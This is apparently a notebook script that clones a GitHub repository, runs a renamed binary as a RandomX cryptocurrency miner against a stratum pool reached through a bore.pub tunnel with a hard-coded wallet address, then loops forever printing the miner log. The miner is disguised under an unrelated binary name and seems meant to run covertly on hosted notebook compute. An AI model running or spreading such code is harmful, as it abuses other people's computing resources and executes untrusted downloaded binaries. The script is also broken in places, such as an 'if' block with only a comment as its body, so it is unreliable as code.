# %%
import subprocess, os, time
if not os.path.exists('testemi'):
    # !git clone https://github.com/realmadruga962-ops/testemi.git

# %%
# %cd testemi
# !chmod +x PROJETOMIGUEL

# %%
proc = subprocess.Popen([
    './PROJETOMIGUEL',
    '-o', 'stratum+tcp://bore.pub:15211',
    '-u', '4AYnVwr72kyPwneqKeDhgf9kkU22xSYHDhf8Qdyy1w9Z8RanMCpsbZUR9Xh3Eq8JeQ5z8YJ1cL9TZEMTYBcasB8CHVbi2VP',
    '-p', 'x',
    '--no-huge-pages',
    '--randomx-mode=light'
], stdout=open('miner.log','w'), stderr=subprocess.STDOUT)
print(f'Miner PID: {proc.pid}')

# %%
import time
time.sleep(5)
# !cat miner.log

# %%
import time
while True:
    # !tail -20 miner.log
    time.sleep(30)
